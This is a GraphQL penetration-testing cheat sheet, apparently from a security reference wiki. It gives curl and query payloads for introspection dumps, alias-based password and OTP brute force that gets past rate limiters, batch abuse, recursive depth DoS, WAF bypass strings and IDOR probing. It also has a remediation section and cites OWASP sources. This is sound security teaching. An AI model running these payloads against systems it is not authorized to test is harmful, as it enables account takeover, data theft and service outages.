# GraphQL Pentest

> Single-endpoint, schema-typed query/mutation API. Introspection, alias-based brute force, batch query abuse, depth/complexity DoS, BOLA on typed objects. Authorized testing only.

## TL;DR
- GraphQL is one HTTP endpoint (`/graphql`) that accepts a query body in `application/json`. Schema-typed, but authorization is still the app's job.
- Two recon wins: **introspection** (`__schema` / `__type` queries) and **suggestions** (Apollo/graphql-js return field-name suggestions in errors when introspection is off).
- Top hits: BOLA / IDOR on object-by-ID resolvers, BFLA when admin queries live in the same schema, batch-query rate-limit bypass, alias-based brute-force, depth/recursion DoS.
- Defence: persisted queries / allow-list, disable introspection in prod, depth + complexity limits, per-field authorization, schema-typed input validation.

## Detection / Discovery

### Identify GraphQL endpoint
Common paths: `/graphql`, `/graphiql`, `/api/graphql`, `/v1/graphql`, `/query`, `/playground`. Also `*.graphql/v1/...` for hosted (Hasura, Apollo Studio, AWS AppSync).

```bash
# Probe — does it accept GraphQL syntax?
curl -X POST https://target/graphql -H 'Content-Type: application/json' \
     -d '{"query":"{__typename}"}'
# Response: {"data":{"__typename":"Query"}} -> confirmed GraphQL.
```

### Introspection
```bash
# Full schema dump
curl -X POST https://target/graphql -H 'Content-Type: application/json' \
  -d '{"query":"query IntrospectionQuery { __schema { types { name fields { name args { name type { name kind ofType { name kind } } } type { name kind ofType { name kind } } } } } }"}'

# With InQL / clairvoyance / GraphQL Voyager for interactive exploration
inql -t https://target/graphql
# Or use the official GraphiQL playground if exposed.
```

### Introspection-disabled — recover schema from suggestions
When introspection is off, errors often return field-name suggestions: `"Did you mean 'currentUser'?"`. **clairvoyance** (https://github.com/nikitastupin/clairvoyance) brute-forces field names against the suggestion oracle.
```bash
clairvoyance -u https://target/graphql -w /usr/share/seclists/Discovery/Web-Content/graphql.txt
```

## Exploitation

### Authentication / authorization issues
- **BOLA** on object-by-ID resolvers: `query { user(id: 2) { email phoneNumber } }` — same auth gap as REST APIs (see [../web/idor.md](../web/idor.md), API1:2023).
- **BFLA**: admin-only mutations sitting in the same schema (`deleteUser`, `setUserRole`, `viewAllOrders`); regular user invokes them.
- **Mass assignment / BOPLA**: mutation `updateProfile(input: { role: ADMIN })` accepted when only the user-controllable subset should be writable.

### Alias-based brute force
Aliases let you issue many sub-queries in a single GraphQL request:
```graphql
{
  l0: login(username: "admin", password: "p0") { token }
  l1: login(username: "admin", password: "p1") { token }
  l2: login(username: "admin", password: "p2") { token }
  # … hundreds in one HTTP request
}
```
Rate-limiter that counts HTTP requests (not GraphQL operations) is defeated. Same trick on OTP brute force, 2FA, password reset.

### Batch query (transport-level)
Apollo / express-graphql accept `[ { query }, { query }, … ]` arrays:
```bash
curl -X POST https://target/graphql -H 'Content-Type: application/json' \
     -d '[{"query":"{me{id}}"}, {"query":"{me{id}}"}, ... 100 times ...]'
```
Same rate-limit bypass as alias batching, different transport.

### Introspection-based BOLA fishing
With the schema, attacker enumerates every typed object that has `id` arguments and tries with incremented IDs. **graphql-cop** and **graphw00f** automate.

### Depth / recursion DoS
Bi-directional relations let you build a cyclic query:
```graphql
{
  user(id: 1) {
    posts { author { posts { author { posts { author { … 100 levels … }}}}}}
  }
}
```
Server CPU/memory explodes. CWE-770.

### Field-suggestion oracle (post-introspection-off)
```bash
curl -X POST https://target/graphql -H 'Content-Type: application/json' \
     -d '{"query":"{ usre { id } }"}'
# Returns: "Cannot query field 'usre' on type 'Query'. Did you mean 'user'?"
# -> 'user' is a valid field. Iterate with clairvoyance / dictionary.
```

### CSRF on GraphQL POST
GraphQL accepts `POST` with `Content-Type: application/json`, which forces CORS preflight (safe). But many GraphQL servers also accept `Content-Type: text/plain` or query-in-URL `GET` — both bypass preflight → standard CSRF if cookies authenticate (see [../web/csrf.md](../web/csrf.md)).

### Server-side request forgery via custom scalars
Schemas that accept a `URL` scalar in mutations (e.g., `updateAvatar(url: "...")`) → SSRF surface (see [../web/ssrf.md](../web/ssrf.md)).

## Bypasses
- Introspection blocked at root but allowed via `__type(name:"...")` per-type → enumerate via known type names (Apollo Server quirk; patched in recent versions).
- WAF blocks `__schema` literal → newline / comment between `__` and `schema`: `__\nschema`, `__/**/schema`.
- Rate-limit per HTTP request → use aliasing or batching to multiply ops within one request.
- `POST /graphql` blocked → try `GET /graphql?query={...}` (express-graphql, Apollo Server default off-by-default but check).

## Defence / Remediation
- **Disable introspection in production**. Apollo: `introspection: false`; graphql-js: strip `IntrospectionType` from schema; Hasura: env `HASURA_GRAPHQL_DISABLE_QUERY_INTROSPECTION=true` (partial).
- **Persisted queries** (Apollo APQ / Hasura allow-list / custom) — server only accepts pre-registered query hashes. Closes alias brute, depth attacks, BFLA-by-typo.
- **Depth limit** + **query complexity** scoring (each field has a weight; reject queries above threshold). Apollo Server has `graphql-query-complexity` middleware.
- **Per-field authorization** — pre-resolve checks on every type/field, not just at the entry point. Use a schema directive (`@auth(requires: ADMIN)`) or middleware (graphql-shield).
- **Rate-limit GraphQL operations**, not just HTTP requests — count `operationName`/aliases/batch members.
- **Disable field-suggestion in errors** in production (`NoSchemaIntrospectionCustomRule` in graphql-js; Apollo error formatter strips `did you mean`).
- **Schema-validate scalar inputs** (URL, Email custom scalars with regex + private-IP block for URL-class to prevent SSRF).
- **Reject `GET` with mutation** in the query body (per spec, GET is read-only).
- **Defend against batched mutations** by disabling batching at the transport layer when the app doesn't need it.

## Sources
- OWASP API Security Top 10 (2023): https://owasp.org/API-Security/editions/2023/en/0x00-header/
- OWASP WSTG-APIT-01 Testing GraphQL: https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/12-API_Testing/01-Testing_GraphQL
- OWASP Cheat Sheet — GraphQL: https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html
- PortSwigger — GraphQL API vulnerabilities: https://portswigger.net/web-security/graphql
- HackTricks GraphQL: https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/graphql.html
- PayloadsAllTheThings GraphQL Injection: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL%20Injection
- InQL Burp extension: https://github.com/doyensec/inql
- clairvoyance (schema recon from suggestions): https://github.com/nikitastupin/clairvoyance
- graphw00f (GraphQL fingerprinting): https://github.com/dolevf/graphw00f
- graphql-cop: https://github.com/dolevf/graphql-cop
- CWE-770 Allocation of Resources Without Limits or Throttling: https://cwe.mitre.org/data/definitions/770.html
